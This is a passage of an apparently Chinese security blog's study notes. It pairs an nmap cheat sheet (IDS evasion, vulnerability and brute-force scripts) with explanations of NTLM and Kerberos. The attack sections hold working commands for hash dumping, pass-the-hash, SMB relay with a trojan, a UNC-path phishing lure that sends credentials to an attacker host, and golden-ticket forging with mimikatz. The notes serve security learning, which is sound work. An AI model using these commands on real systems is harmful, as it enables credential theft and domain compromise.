class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>p80<span class="number">-89</span>,<span class="number">8080</span><span class="number">-8099</span>,<span class="number">8000</span><span class="number">-8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="comment">--open --max-hostgroup</span></span><br><span class="line"><span class="number">10</span> <span class="comment">--max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>O <span class="operator">-</span>P0 <span class="comment">--open -n -oN result.txt -p80-89,8080-8099,8000-</span></span><br><span class="line"><span class="number">8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="operator">-</span>iL ip.txt</span><br><span class="line"><span class="comment">--open 只输出端口开放的结果 输出到result.txt文件</span></span><br></pre></td></tr></table></figure><h2 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>O 启用操作系统检测,<span class="operator">-</span>A来同时启用操作系统检测和版本检测</span><br><span class="line"><span class="comment">--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和</span></span><br><span class="line">closed的端口)</span><br><span class="line"><span class="comment">--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提</span></span><br><span class="line">供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><h2 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>f; <span class="comment">--mtu value 指定使用分片、指定数据包的MTU.</span></span><br><span class="line"><span class="operator">-</span>D decoy1,decoy2,ME 使用诱饵隐蔽扫描</span><br><span class="line"><span class="operator">-</span>S IP<span class="operator">-</span>ADDRESS 源地址欺骗</span><br><span class="line"><span class="operator">-</span>e interface 使用指定的接口</span><br><span class="line"><span class="operator">-</span>g<span class="operator">/</span> <span class="comment">--source-port PROTNUM 使用指定源端口</span></span><br><span class="line"><span class="comment">--proxies url1,[url2],... 使用HTTP或者SOCKS4的代理</span></span><br><span class="line"><span class="comment">--data-length NUM 填充随机数据让数据包长度达到NUM</span></span><br><span class="line"><span class="comment">--ip-options OPTIONS 使用指定的IP选项来发送数据包</span></span><br><span class="line"><span class="comment">--ttl VALUE 设置IP time-to-live域</span></span><br><span class="line"><span class="comment">--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装</span></span><br><span class="line"><span class="comment">--badsum 使用错误的checksum来发送数据包</span></span><br></pre></td></tr></table></figure><h2 id="Nmap输入"><a href="#Nmap输入" class="headerlink" title="Nmap输入"></a>Nmap输入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>iL ip.txt  从文件加载目标扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap输出"><a href="#Nmap输出" class="headerlink" title="Nmap输出"></a>Nmap输出</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span><span class="keyword">oN</span> 将标准输出直接写入指定的文件</span><br><span class="line"><span class="operator">-</span>oX 输出xml文件</span><br><span class="line"><span class="operator">-</span>oS 将所有的输出都改为大写</span><br><span class="line"><span class="operator">-</span>oG 输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line"><span class="operator">-</span>oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line"><span class="operator">-</span>v 提高输出信息的详细度</span><br><span class="line"><span class="operator">-</span>d level 设置debug级别,最高是<span class="number">9</span></span><br><span class="line"><span class="comment">--reason 显示端口处于带确认状态的原因</span></span><br><span class="line"><span class="comment">--open 只输出端口状态为open的端口</span></span><br><span class="line"><span class="comment">--packet-trace 显示所有发送或者接收到的数据包</span></span><br><span class="line"><span class="comment">--iflist 显示路由信息和接口,便于调试</span></span><br><span class="line"><span class="comment">--log-errors 把日志等级为errors/warings的日志输出</span></span><br><span class="line"><span class="comment">--append-output 追加到指定的文件</span></span><br><span class="line"><span class="comment">--resume FILENAME 恢复已停止的扫描</span></span><br><span class="line"><span class="comment">--stylesheet PATH/URL 设置XSL样式表，转换XML输出</span></span><br><span class="line"><span class="comment">--webxml 从namp.org得到XML的样式</span></span><br><span class="line"><span class="comment">--no-sytlesheet 忽略XML声明的XSL样式表</span></span><br></pre></td></tr></table></figure><h2 id="其他nmap选项"><a href="#其他nmap选项" class="headerlink" title="其他nmap选项"></a>其他nmap选项</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-6</span> 开启IPv6</span><br><span class="line"><span class="operator">-</span>A OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line"><span class="comment">--datedir DIRNAME 说明用户Nmap数据文件位置</span></span><br><span class="line"><span class="comment">--send-eth / --send-ip 使用原以太网帧发送/在原IP层发送</span></span><br><span class="line"><span class="comment">--privileged 假定用户具有全部权限</span></span><br><span class="line"><span class="comment">--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限</span></span><br><span class="line"><span class="operator">-</span>V 打印版本信息</span><br><span class="line"><span class="operator">-</span>h 输出帮助<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-sC 根据端口识别的服务,调用默认脚本</span><br><span class="line">--script=”Lua scripts” 调用的脚本名</span><br><span class="line">--script-args=n1=v1,[n2=v2] 调用的脚本传递的参数</span><br><span class="line">--script-args-file=filename 使用文本传递参数</span><br><span class="line">--script-trace 显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb 更新脚本的数据库</span><br><span class="line">--script-help=”Lua script” 显示指定脚本的帮助</span><br><span class="line">nmap -sV --script=ssl-heartbleed target_ip 扫描心脏滴血漏洞</span><br><span class="line">nmap -p 6379 --script redis-info target_ip扫描redis未授权访问漏洞</span><br><span class="line">nmap -p 27017 --script mongodb-info target_ip 扫描mongodb未授权访问漏洞</span><br><span class="line">nmap -p 21 --script ftp-anon.nse -v target_ip 扫描ftp匿名访问的漏洞</span><br><span class="line">nmap -p 21 --script ftp-brute.nse -v target_ip 对目标IP进行ftp弱口令爆破</span><br><span class="line">nmap -p 22 --script ssh-brute.nse -v target_ip 对目标IP进行ssh口令爆破</span><br><span class="line">nmap -p445 –script smb-vuln-ms17-010 target_ip/mask 对目标网段进行永恒之蓝漏洞扫描</span><br><span class="line">nmap --script参数使用。 写出示例，扫描心脏滴血，扫描redis未授权，扫描ftp匿名访问，扫描永恒之蓝</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;格式：&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;nmap [ &amp;lt;扫描类型&amp;gt; …] [ &amp;lt;选项&amp;gt; ] { &amp;lt;扫描目标说明&amp;gt; }&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nmap进行完整全面的扫描&lt;/p&gt;
&lt;figure class=</summary>
      
    
    
    
    
    <category term="命令" scheme="https://bstark.me/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/1/"/>
    <id>https://bstark.me/posts/1/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-04-01T06:45:15.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>NTLM认证机制在工作组环境下和在域环境下是不同的, 域环境下有两套认证体系,默认使用Kerberos,当kerberos 认证错误时则采用NTLM认证</p><p><strong>Windows如何判断域登陆OR本地登陆</strong>(NTLM&amp;Kerberos选择)</p><p>如果是本地用户登录的话将会使用本地数据库进行认证，如果是域登录的话将会丢给Kerberos SSP去认证。当用户按下键盘Crt+Alt+Del后，Winlogon读取完用户的身份凭据后，把它交给本地安全机构（LSA）<strong>LSASS.exe</strong>，LSA会对凭证做一系列安全加密编码操作如MD4加密，加密结束后会通过SSPI(安全支持提供者接口，该接口负责与Kerberos和NTLM服务沟通)来判断是应该交给Ntlm处理，还是Kerberos SSPI进行处理。LSA首先根据用户输入UPN等信息会事先把身份认证请求传递到Kerberos SSP。</p><p>Kerberos SSP验证用户登入目标是本地计算机还是域，如果是域则继续向下处理，如果是本地计算机则会向SSPI返回一条错误消息，SSPi将它将这个任务交回给GINA处理。</p><p>SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM （Local Security Account Manager，本地安全账户管理器）数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</p><p><strong>总结:</strong></p><p>无论是域登录还是本地登录(NTLM&amp;Kerberos) 都会在本地由winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希,都存在抓取本地hash.</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><strong>工作组环境NTLM认证流程</strong></p><p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)-&gt;认证成功后舍弃明文密码,保存哈希</p><ol><li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本地，舍<br>弃明文密码</li><li>客户端将username明文传输到服务器</li><li>然后服务器会随机生成16字节的challenge挑战码返回给客户端</li><li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li><li>服务器在接收到客户端发来的response、challenge、username，会拿着username在自己的SAM文件中查询出对应的<br>hash，并用hash对challenage客户端发来的response进行对比，相同则身份验证成功</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172808022.png" alt="image-20220222172808022"></p><p><strong>域环境NTLM认证流程：</strong></p><ol><li>首先用户在客户端输入username、password，然后客户端会先将用户输入的password进行hash计算并保存在本<br>地，舍弃明文密码</li><li>客户端将username明文传输到服务器</li><li>然后服务器会随机生成16字节的challenge挑战码返回给客户端。</li><li>客户端接收到challenge之后，会用第一步生成的hash对challenge进行加密（称为response），和challenge、<br>username一起发送给服务器</li><li>服务端将客户端发来的信息转发给域控</li><li>域控在接收到服务端发来的response、challenge、username，会拿着username在自己的活动目录数据库<br>（ntds.dit）中查询出对应的hash，并用hash对challenage进行一次加密，再与客户端发来的response进行对比，相<br>同则身份验证成功</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172849823.png" alt="image-20220222172849823"></p><h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><h4 id="域的Hash获取"><a href="#域的Hash获取" class="headerlink" title="域的Hash获取"></a>域的Hash获取</h4><p>与普通PC的Hash获取思路是一样的，但是要注意两个事情</p><ol><li>即使是DC,常规获取hash的思路依然只能获取本地用户的hash，并不能获取整个域的用户hash</li><li>即使是域内用户机，常规获取hash的思路依然有可能拿到域管理员的hash，只要域管理员通过RDP登录过，就会将hash保存到 lsass 中</li></ol><ul><li>Secretsdump脚本直接导出域Hash</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 账号:密码@IP地址</span><br></pre></td></tr></table></figure><p>其他常见的获取方法:</p><p>1.NTDS.dit 获取域控hash（手动导出NTDS.dit、工具：NTDSDumpEx）</p><p>2.VSSADMIN（卷影拷贝服务）</p><p>3.Mimikatz的 dcsync 功能</p><h4 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击 (PTH)"></a>哈希传递攻击 (<strong>PTH</strong>)</h4><ul><li>利用impacket工具包等..： </li></ul><p>smbexec.py / psexec.py / wmiexec.py / atexec.py </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法： smbexec.py [domain/] username @ [Target IP Address] –hashes 哈希值</span><br><span class="line"></span><br><span class="line">smbexec.py domain/Administrator@192.168.10.2 -hashes aad3b435b51404eeaad3b435b51404ee:99d85d9d737629f593b11771123df22c </span><br></pre></td></tr></table></figure><ul><li>mimikatz的 pth 功能 </li></ul><p>语句： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</span><br></pre></td></tr></table></figure><p>在弹出cmd后，可以使用net use列出远程主机中的内容 sekurlsa::pth /user:账号 /domain:密码 /ntlm:获取到的NTLM</p><p>利用 msf 模块：</p><p> • exploit/windows/smb/psexec</p><p> • exploit/windows/smb/psexec_psh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set rhost IP地址</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbuser 用户名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbdomain 域名</span><br><span class="line">• msf &gt; exploit(windows/smb/psexec) &gt; set smbpass 密码的hash值</span><br></pre></td></tr></table></figure><h4 id="SMB重放攻击-中间人攻击"><a href="#SMB重放攻击-中间人攻击" class="headerlink" title="SMB重放攻击 (中间人攻击)"></a>SMB重放攻击 (中间人攻击)</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/wKg0C158JVKASUlFAADWfRa5rDk155.jpg" alt="img"></p><p><strong>重放攻击的ntlm认证过程</strong>：</p><ol><li>Client端还是正常向服务端发送登录请求，由于client端此时并不知道攻击者的存在，它以为请求是发送给了server端，但<br>实际上它是先发给了攻击者</li><li>然后攻击者再拿着这个用户名伪装成client端发送给server端，此时server端正常返回一个challenge（挑战码）</li><li>攻击者拿到这个challenge（挑战码）以后，再把它返回给client端</li><li>而 client 端拿到 challenge 在本地和自己的密码DES加密以后，会把这个response再次发送给攻击者，此时client依然认<br>为攻击者就是server端</li><li>最后，攻击者会拿着client端发过来的这个response再把它交给server端去验证</li><li>server端此时到自己的数据库中对比，发现hash一致认证通过, 可见一次简单的smb中间人攻击就这样完成了</li></ol><p><strong>原理:</strong></p><p>先欺骗SMB流量,后重放, 通过内网嗅探欺骗 利用获取的传输中的NET NTML hash.拿到NET NTML hash后可以代替<strong>对方</strong>直接impacket等工具登录.执行命令 </p><p><strong>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash</strong> 格式为 username::domain:Challenge:HMAC-MD5:blob 这三个值就是相当于欺骗了凭证.</p><p>攻击者充当客户端的服务器，并充当服务器的客户端。他从客户端消息中提取NTLM身份验证Blob，并将其放入服务器的修改后的消息中，反之亦然。最后，他可以根据需要使用经过身份验证的会话。</p><p><strong>利用条件:</strong></p><ul><li>目标机不能开启smb签名，否则利用无效，一般情况下 <strong>Windows Server 机器会默认开启</strong>，而Windows [win7/8/8.1/10]<br>默认不会开启</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以利用nmap探测smb是否关闭</span><br><span class="line">nmap -sT -p <span class="number">445</span> -Pn --open --script smb-security-<span class="built_in">mode</span>.nse 目标IP</span><br></pre></td></tr></table></figure><ul><li>一些打了ms08-068[KB957097]补丁的老系统，如 Windows xp/2003 以下的系统，也无法利用</li></ul><p><strong>利用工具:</strong></p><p> impacket 套件中的 smbrelayx.py，进行smb中继攻击监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 目标机IP地址 –e 木马路径</span><br></pre></td></tr></table></figure><p>当目标机器 使用登录smb服务时,我们捕捉到了smb 的登录凭证hash 可以使用Hashcat破解就行了。</p><p>之后拿着这个hash到目标机器中去尝试登录smb执行命令上线马子.</p><p><strong>拓展：</strong></p><p>在实际渗透过程中，往往会配合钓鱼进行，红队经常这么玩。</p><p>1、在共享上放置特殊的目录，当用户点到这个目录的时候会自动请求攻击的SMB</p><p>2、可以通过在 Client 经常访问的 Web 网站上插入 UNC 路径, 例如 <img src="\\192.168.1.2\logo.jpg" /> 以进行 SMB 请求 (当前用户凭据).</p><p>3、在doc或邮件正文里插入文件，然后将相应的链接改为UNC路径（类似这种\servername\sharename格式），通过内网邮件发送给对方</p><p>4、利用PDF的GoTobe和GoToR功能让对方打开PDF时自动请求SMB服务器上的文件等等。一般企业内部员工看到内部的邮件或公用共享文件夹会放松警惕，当点开之后，当前用户密码登录凭证已经被人拿到。<br>参考文章：<a href="https://cloud.tencent.com/developer/news/200028">https://cloud.tencent.com/developer/news/200028</a></p><p>5、metasploit中的auxiliary/docx/word_unc_injector会创建一个带有unc路径的word文件，当该文件被打开的时候攻击机器的msf上就会收到NTLMv2 hash。</p><h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><p>kerberos认证涉及到三方</p><p>1.访问服务的client</p><p>2.提供服务的server</p><p>3.KDC密钥分发中心,KDC分为AS和TGS</p><p><strong>KDC密钥分发中心</strong></p><p><strong>AS</strong>(Authentication Server)</p><p>AS的作用就是验证Client端的身份(确定你是身份证本人),验证通过后就会给你一张TGT票给Client.</p><p><strong>TGS</strong>(Ticket Granting Server)</p><p>TGS的作用是通过AS发送给Client的票(TGT)换取访问Server的票(ST)</p><h3 id="认证流程-1"><a href="#认证流程-1" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222172950947.png" alt="image-20220222172950947"></p><p><strong>过程简述</strong></p><p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p><p>这就是<code>AS(Authentication Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p><p>成功后，<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p><p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p><p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p><p><strong>较详简述</strong></p><ol><li><strong>AS_REQ</strong>: <code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是<code>Client hash</code>加密的时间戳</li><li><strong>AS_REP</strong>: <code>KDC</code>使用<code>Client hash</code>进行解密，如果结果正确就返回用<code>krbtgt hash</code>加密的<code>TGT</code>票据，<code>TGT</code>里面包含<code>PAC</code>，<code>PAC</code>包含<code>用户Client</code>的<code>sid</code>和<code>用户Client</code>所在的<code>组</code>。</li><li><strong>TGS_REQ</strong>: <code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>发起针对特定<code>Server</code>的<code>TGS_REQ</code>请求</li><li><strong>TGS_REP</strong>: <code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]（这一步不管用户有没有访问<code>Server</code>的权限，只要<code>TGT</code>正确，就返回<code>TGS</code>票据 [<code>Ticket</code>]）</li><li><strong>AP_REQ</strong>: <code>Client</code>拿着<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></li><li><strong>AP_REP</strong>: <code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限。</li></ol><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220222173025997.png" alt="image-20220222173025997"></p><p><strong>自己理解</strong></p><p>(1)client拿着自己的hash申请 向 KDC下属的AS身份认证机构 请求认证(去车站拿身份证实名)</p><p>(2)KDC下属的AS身份认证机构 审核通过后,返回用krbtgt hash<code>加密的</code>TGT`票据给client. </p><p>(3)<code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>下属的TGS去买票 要用什么服务</p><p>(4)<code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]</p><p>(5)<code>Client</code>拿着KDC 下属的TGS给的<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></p><p>(6)<code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限.</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p><strong>黄金票据</strong></p><p><strong>原理</strong>: 问题出在第二步. 我们如果拿到krbtgt账号的 hash 就可以直接跳过 AS身份认证的部分. 直接拿着krbtgt账号的 hash去伪造 TGT票据 也就是黄金票据.</p><p><strong>伪造过程</strong></p><p>条件要求：</p><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM-HASH</li><li>伪造用户名，可以是任意用户名</li></ol><p>第一步：获取域控的 krbtgt NTLM Hash（在域控中）</p><ul><li>通过mimikatz，获取 krbtgt 的哈希值</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令：lsadump::dcsync /domain:域名/user:krbtgt</span><br><span class="line"></span><br><span class="line">mimikatz# sekurlsa::kerberos</span><br><span class="line">mimikatz# sekurlsa::logonpassword</span><br><span class="line">mimikatz# lsadump::dsync /domain:xxx.xxx.xxx /user:krbtgt</span><br></pre></td></tr></table></figure><p>第二步：生成伪造黄金票据 （在client端）</p><ul><li>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成黄金票据 golden.kiribi，即成功伪造TGT</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令：kerberos::golden /user:伪造的用户名/domain:域名 /sid:user-sid /krbtgt:ntlmhash值 /ticket:票据名称</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域的SID （不包括后<span class="number">3</span>位）</span><br><span class="line">/krbtgt: krbtgt 的 NTLM-HASH 值</span><br><span class="line">/ticket:生成的票据名称</span><br></pre></td></tr></table></figure><p> 第三步：获取权限（在client端）</p><p> • 清空本地票据缓存，导入伪造的票据</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kerberos::<span class="title">list</span> #查看本地保存的票据，观察<span class="title">client</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">purge</span> #清理本地票据缓存</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> 票据名 #导入伪造的黄金票据</span></span><br><span class="line"><span class="function"><span class="title">cmd</span>下查看 <span class="title">klist</span> # 查看票据</span></span><br><span class="line"><span class="function">* 注意：票据20分钟内有效，过期之后可以再次导入</span></span><br></pre></td></tr></table></figure><p> 第四步：利用伪造的黄金票据：（在client端）<br>• 远程登陆和执行命令。在Client端通过Psexec.exe工具来与域中其他主机进行连接，连接成功了以后，是直接返回一个cmd的交互式界面，并且是最高权限。<br>• 注意：最后进行远程登录和命令执行时，为计算机全名，不能为IP地址</p><p><strong>白银票据</strong></p><p><strong>原理</strong>: 问题出在第四步. <code>KDC</code>下属的TGS 使用<code>krbtgt hash</code>进行对拿过来的TGT凭证 解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]  .如果拿到Server账号hash就可以直接跳过 AS身份认证的部分,服务授权部分. 直接拿着Server账号hash去伪造 TS票据 